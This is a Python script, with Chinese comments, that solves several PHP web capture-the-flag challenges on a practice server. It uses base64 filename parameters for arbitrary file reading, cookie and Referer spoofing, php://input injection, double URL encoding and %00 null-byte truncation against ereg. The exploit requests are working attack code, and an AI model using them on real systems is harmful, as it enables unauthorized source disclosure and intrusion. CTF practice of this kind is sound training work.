# cookies 欺骗
# http://123.206.87.240:8002/web11/index.php?line=&filename=a2V5cy50eHQ=
import base64
import requests
# 解码url中的base64参数
print(base64.b64decode("a2V5cy50eHQ=").decode("utf-8"))
# 发现是文件名，于是构造index.php的base64参数
print(base64.b64encode(b'index.php'))
# 按行获取源码
line = 0
s = requests.session()
# 这里循环次数足够大就行
while line < 50:
    url = "http://123.206.87.240:8002/web11/index.php?line="+str(line)+"&filename="+base64.b64encode(b'index.php').decode("utf-8")
    print(s.get(url).text)
    line += 1
# 根据源码构造带cookie的访问
cookies = {'margin': 'margin'}
flag_url = "http://123.206.87.240:8002/web11/index.php?line=&filename="+base64.b64encode(b'keys.php').decode("utf-8")
print(s.get(flag_url, cookies=cookies).text)



# web8
# http://123.206.87.240:8002/web8/
import requests
s = requests.session()
params = {str.encode("1")}
flag_url = "http://123.206.87.240:8002/web8/?ac=1&fn=php://input"
# 这里构造的访问参数php://input只能传一个字符，不具有普适性，希望以后能解决
print(s.post(flag_url, data=params).text)



# 你从哪里来
# http://123.206.87.240:9009/from.php
import requests
s = requests.session()
# 伪造请求头即可
headers = {"referer": "https://www.google.com"}
flag_url = "http://123.206.87.240:9009/from.php"
print(s.post(flag_url, headers=headers).text)



# extract变量覆盖
# http://123.206.87.240:9009/1.php
import requests
s = requests.session()
# php://input
data = {b"1"}
flag_url = "http://123.206.87.240:9009/1.php?shiyan=1&flag=php://input"
print(s.post(flag_url, data=data).text)



# urldecode二次编码绕过
# http://123.206.87.240:9009/10.php
# 第一次是$_GET['id']默认解码，第二次是代码里面执行了解码，只需要将参数编码两次就可以了
# 这里使用parse.quote()编码字母并不能完成转换
# 查表得a的url码为%61于是将其改成url码再url编码一次就可以了
import requests
from urllib import parse
s = requests.session()
flag_url = "http://123.206.87.240:9009/10.php?id="+parse.quote("h%61ckerDJ")
print(s.get(flag_url).text)



# 数组返回NULL绕过
# http://123.206.87.240:9009/19.php
import requests
# 考察ereg的%00截断，构造参数?password=数字%00--就行了
s = requests.session()
flag_url = "http://123.206.87.240:9009/19.php?password=1%00--"
print(s.get(flag_url).text)



# ereg正则%00截断
# http://123.206.87.240:9009/5.php
import requests
# 考察ereg的%00截断和科学计数法，1e8即10**8
# 此题给的源码貌似有误，判断条件的'-'应该为'*-*'否则得不到flag
s = requests.session()
flag_url = "http://123.206.87.240:9009/5.php?password=1e8%00*-*"
print(s.get(flag_url).text)














